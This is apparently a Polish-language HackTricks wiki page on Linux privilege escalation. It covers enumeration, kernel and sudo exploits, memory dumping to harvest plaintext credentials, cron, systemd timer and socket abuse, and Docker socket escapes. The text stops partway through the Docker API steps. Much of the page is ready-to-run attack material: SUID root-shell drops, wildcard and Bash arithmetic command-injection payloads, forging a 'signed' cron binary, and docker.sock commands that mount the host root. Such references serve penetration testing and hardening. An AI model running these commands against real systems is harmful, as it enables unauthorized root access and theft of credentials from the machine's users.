# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy zbierać informacje o działającym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli **masz uprawnienia zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`** możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje jakiś exploit, który można wykorzystać do eskalacji uprawnień.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych kerneli i niektóre już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje kernela z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić IN victim, tylko sprawdza exploits dla kernel 2.x)

Zawsze **wyszukaj wersję kernela w Google**, być może twoja wersja kernela jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że ten exploit jest prawidłowy.

Dodatkowa technika wykorzystania kernela:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji Sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje sudo sprzed 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym lokalnym użytkownikom eskalować uprawnienia do root za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Zanim uruchomisz exploit, upewnij się, że Twoja wersja `sudo` jest podatna i że obsługuje funkcję `chroot`.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład** tego, jak tę vuln można wykorzystać.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SELinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz docker container możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **what is mounted and unmounted**, gdzie i dlaczego. Jeśli coś jest unmounted, możesz spróbować to mount i sprawdzić, czy nie zawiera prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **jakikolwiek kompilator jest zainstalowany**. To przydatne, jeśli musisz użyć kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której będziesz go używać (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręcznie sprawdzić wersję bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp przez SSH do maszyny, możesz także użyć **openVAS**, aby sprawdzić przestarzałe i podatne na ataki oprogramowanie zainstalowane na maszynie.

> [!NOTE] > _Zwróć uwagę, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne; dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Procesy

Zwróć uwagę, które **procesy** są uruchomione i sprawdź, czy któryś proces ma **więcej uprawnień niż powinien** (może tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj możliwe [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Sprawdź też **swoje uprawnienia do binarek procesów**, może uda ci się nadpisać czyjeś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do zidentyfikowania podatnych procesów uruchamianych często lub gdy spełnione są określone warunki.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **root privileges**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego zwykle jest to bardziej przydatne, gdy jesteś już root i chcesz odkryć więcej credentials.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz czytać pamięć procesów, które posiadasz**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn **nie pozwala na ptrace domyślnie**, co oznacza, że nie możesz zrzucać innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz wyciągnąć Heap i przeszukać go w poszukiwaniu credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazują, jak pamięć jest mapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazują też **uprawnienia każdego mapowanego regionu**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** oraz ich offsety. Wykorzystujemy te informacje, aby **seek into the mem file and dump all readable regions** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Przestrzeń adresowa wirtualna jądra może być dostępna przy użyciu /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla Linux

ProcDump to wersja dla Linuxa klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić proces należący do ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby dumpowania pamięci procesu) i przeszukać pamięć w poszukiwaniu poświadczeń:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wykrada **poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Cron jobs

### Crontab UI (alseambusher) uruchomiony jako root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest dostępny tylko na loopback, nadal możesz do niego dotrzeć przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie w celu eskalacji uprawnień.

Typowy łańcuch
- Odkryj port dostępny tylko z loopback (np. 127.0.0.1:8000) oraz Basic-Auth realm za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunel i logowanie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; ogranicz do dedykowanego użytkownika z minimalnymi uprawnieniami
- Ogranicz nasłuch do localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie stosuj ponownie haseł
- Unikaj osadzania sekretów w unit files; użyj secret stores lub EnvironmentFile dostępnego tylko dla root
- Włącz audyt/logowanie dla uruchomień na żądanie



Sprawdź, czy któreś zadanie zaplanowane jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? czy możesz modyfikować pliki, których używa root? użyć symlinks? utworzyć konkretne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka crona

Na przykład, w pliku _/etc/crontab_ można znaleźć zmienną PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcardem (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, możesz to wykorzystać do wykonania nieoczekiwanych rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_**, to nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików związanych z wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter/variable expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) oraz let. Jeśli root cron/parser czyta nieufne pola z logów i wkłada je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron zostanie uruchomiony.

- Dlaczego to działa: W Bashu ekspansje zachodzą w takiej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, a potem word splitting i pathname expansion. Dlatego wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` zostaje najpierw podmieniona (uruchamiając komendę), a potem pozostała liczba `0` jest użyta w obliczeniu, więc skrypt działa bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spraw, by kontrolowany przez atakującego tekst został zapisany w logu parsowanym tak, aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoja komenda nie pisze na stdout (lub przekieruj jej wyjście), żeby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **directory where you have full access**, być może warto usunąć ten folder i **create a symlink folder to another one** wskazujący na inny folder, który będzie serwował script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams czasami "sign" cron-driven binaries przez zrzucenie custom ELF section i greppowanie vendor string przed uruchomieniem ich jako root. Jeśli ten binary jest group-writable (np. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i możesz leak the signing material, możesz sfałszować sekcję i przejąć zadanie crona:

1. Użyj `pspy`, żeby przechwycić verification flow. W Era root uruchomił `objcopy --dump-section .text_sig=text_sig_section.bin monitor` a następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potem wykonał plik.
2. Odtwórz oczekiwany certificate używając the leaked key/config (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj złośliwą zamianę (np. drop a SUID bash, dodaj swój SSH key) i osadź certificate w `.text_sig`, tak by grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowany binary, zachowując execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na kolejny run crona; gdy naiwny signature check powiedzie się, twój payload uruchomi się jako root.

### Frequent cron jobs

Możesz monitorować procesy, żeby wyszukać te, które są wykonywane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i eskalować uprawnienia.

Na przykład, aby **monitor every 0.1s during 1 minute**, **sort by less executed commands** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wypisywać każdy uruchomiony proces).

### Niewidoczne zadania cron

Można stworzyć cronjob **wstawiając znak carriage return po komentarzu** (bez znaku nowej linii), i zadanie cron będzie działać. Przykład (zwróć uwagę na znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisowalne _.service_ pliki

Sprawdź, czy możesz zapisać dowolny plik `.service` — jeśli tak, możesz go **zmodyfikować**, aby **uruchamiał** Twój **backdoor** gdy usługa jest **uruchamiana**, **ponownie uruchamiana** lub **zatrzymywana** (może będziesz musiał poczekać na ponowne uruchomienie maszyny).\
Na przykład umieść swój backdoor w pliku .service używając **`ExecStart=/tmp/script.sh`**

### Zapisowalne binaria usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmienić na backdoory, tak że gdy usługi zostaną ponownie uruchomione, backdoory zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z folderów na ścieżce, możesz być w stanie **escalate privileges**. Musisz wyszukać **używania ścieżek względnych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **plik wykonywalny** o **tej samej nazwie co binarka z relatywnej ścieżki** w folderze PATH systemd, do którego masz uprawnienia zapisu, a gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie uruchomiony** (użytkownicy bez uprawnień zazwyczaj nie mogą startować/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron — mają wbudowaną obsługę zdarzeń czasowych opartych na kalendarzu oraz zdarzeń monotonicznych i mogą działać asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on niektóre istniejące jednostki systemd.unit (np. `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, czym jest Unit:

> Jednostka, którą należy aktywować, gdy ten timer wygaśnie. Argumentem jest nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określona, wartość ta domyślnie wskazuje na service, który ma tę samą nazwę co jednostka timer, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, oraz nazwa jednostki timer były identyczne, z wyjątkiem sufiksu.

W związku z tym, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jakąś jednostkę systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i na której masz **uprawnienia zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

Dowiedz się więcej o timerach za pomocą `man systemd.timer`.

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i wykonania:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Uwaga: **timer** jest **aktywowany** przez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację międzyprocesową** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji międzykomputerowej i są konfigurowane przez pliki `.socket`.

Sockets można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o sockets przy pomocy `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje są różne, ale w skrócie służą do **wskazania, gdzie będzie nasłuchiwać** socket (ścieżka pliku socket AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia **uruchamiana jest instancja usługi**, a przekazywany jest tylko socket połączenia. Jeśli **false**, wszystkie sockety nasłuchujące same są **przekazywane do uruchomionej jednostki usługi**, i tworzona jest tylko jedna jednostka usługi dla wszystkich połączeń. Ta wartość jest ignorowana dla datagramów i FIFO, gdzie pojedyncza jednostka usługi bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony tak, aby były odpowiednie dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i związaniu nasłuchujących **socketów**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być absolutną ścieżką do pliku wykonywalnego, a następnie podawane są argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie wskazuje usługę o tej samej nazwie co socket (ze zmienionym sufiksem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Zapisowalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na ponowne uruchomienie maszyny.**\
_Uwaga, system musi używać tej konfiguracji pliku socket, inaczej backdoor nie zostanie uruchomiony_

### Zapisowalne sockets

Jeśli **zidentyfikujesz jakikolwiek zapisywalny socket** (_mówimy tutaj o Unix Sockets, a nie o konfiguracyjnych plikach `.socket`_), to **możesz komunikować się** z tym socketem i być może wykorzystać lukę.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład wykorzystania:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że mogą istnieć pewne **sockets nasłuchujące żądań HTTP** (_nie mam tu na myśli .socket files, tylko plików działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś podatność**.

### Zapisywalny Docker socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. Domyślnie jest zapisywalny przez użytkownika `root` oraz członków grupy `docker`. Posiadanie uprawnień zapisu do tego socketu może prowadzić do privilege escalation. Poniżej znajduje się wyjaśnienie, jak można to zrobić, oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation z Docker CLI**

Jeśli masz prawa zapisu do Docker socket, możesz escalate privileges używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W sytuacjach, gdy Docker CLI nie jest dostępne, docker socket można nadal kontrolować przy użyciu Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który zamontuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
